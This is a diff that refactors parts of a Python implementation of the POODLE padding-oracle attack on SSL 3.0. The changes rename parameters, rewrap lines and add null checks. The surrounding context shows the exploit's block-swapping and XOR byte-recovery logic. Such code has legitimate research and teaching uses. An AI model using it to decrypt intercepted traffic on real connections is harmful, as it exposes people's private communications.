@@ -65,11 +65,10 @@ class POODLE(object):
                 char1 = self.block(block - 1)[-1]
                 char2 = self.block(-2)[-1]
 
-                # Python 2: Incoming message is a string, not bytes
-                #plain = chr(ord(char1) ^ ord(char2) ^ (self.block_size - 1))
                 plain_value = char1 ^ char2 ^ (self.block_size - 1)
                 plain = chr(plain_value)
-                print('Found block %u byte %u after %u tries: 0x%02x "%c"' % (block, byte, tries + 1, plain_value, plain))
+                print('Found block %u byte %u after %u tries: 0x%02x "%c"' %
+                      (block, byte, tries + 1, plain_value, plain))
 
                 return plain
 
@@ -83,7 +82,8 @@ class POODLE(object):
 
         attempts_to_make = 1500     # The theory is, that after 256 attempts, the byte is known. In practice, no.
         self._reset_success_msg()
-        got_it, tries = self.trigger_find_byte(attempts_to_make, 'A' * (self.block_edge + prefix_length), 'A' * suffix_length)
+        got_it, tries = self.trigger_find_byte(attempts_to_make,
+                                               'A' * (self.block_edge + prefix_length), 'A' * suffix_length)
         if got_it:
             char1 = self.block(block - 1, self.success_id)[-1]
             char2 = self.block(-2, self.success_id)[-1]
@@ -102,38 +102,40 @@ class POODLE(object):
         self.success_id = None
         self.message = {}
 
-    def message_callback(self, msg, id=0):
-        self.message[id] = msg
+    def message_callback(self, msg, connection_id=0):
+        self.message[connection_id] = msg
         if self.phase != POODLE.PHASE_EXPLOIT:
             return False, msg
-        return True, self.alter(id)
+        return True, self.alter(connection_id)
 
-    def mark_error(self, id=0):
+    def mark_error(self, connection_id=0):
         self.was_error = True
-        del self.message[id]
+        del self.message[connection_id]
         return
 
-    def mark_success(self, id=0):
+    def mark_success(self, connection_id=0):
         self.was_success = True
-        self.success_id = id
+        self.success_id = connection_id
         return
 
-    def alter(self, id=0):
-        msg = self.message[id]
-        msg = msg[:-self.block_size] + self.block(self.target_block, id)
+    def alter(self, connection_id=0):
+        msg = self.message[connection_id]
+        msg = msg[:-self.block_size] + self.block(self.target_block, connection_id)
         return msg
 
-    def block(self, n, id=0):
-        if id not in self.message:
-            print("block(%d, %d) is about to fail! Messages: %s" % (n, id, self.message))
-        return self.message[id][n * self.block_size:(n + 1) * self.block_size]
+    def block(self, n, connection_id=0):
+        if connection_id not in self.message:
+            print("block(%d, %d) is about to fail! Messages: %s" % (n, connection_id, self.message))
+        return self.message[connection_id][n * self.block_size:(n + 1) * self.block_size]
 
     def detect_block_info(self):
         self.phase = POODLE.PHASE_BOUNDS_CHECK
+        msg = None
         if self.async:
             self._reset_success_msg()
             got_it, tries = self.trigger_find_byte(1, '')
-            msg = self.message[self.success_id]
+            if got_it:
+                msg = self.message[self.success_id]
         else:
             msg = self.trigger('')
         if not msg:
@@ -143,10 +145,12 @@ class POODLE(object):
         self.recovery_length = len(msg)
 
         for i in range(1, 15):
+            msg = None
             if self.async:
                 self._reset_success_msg()
                 got_it, tries = self.trigger_find_byte(1, 'A' * i)
-                msg = self.message[self.success_id]
+                if got_it:
+                    msg = self.message[self.success_id]
             else:
                 msg = self.trigger('A' * i)
             if not msg:
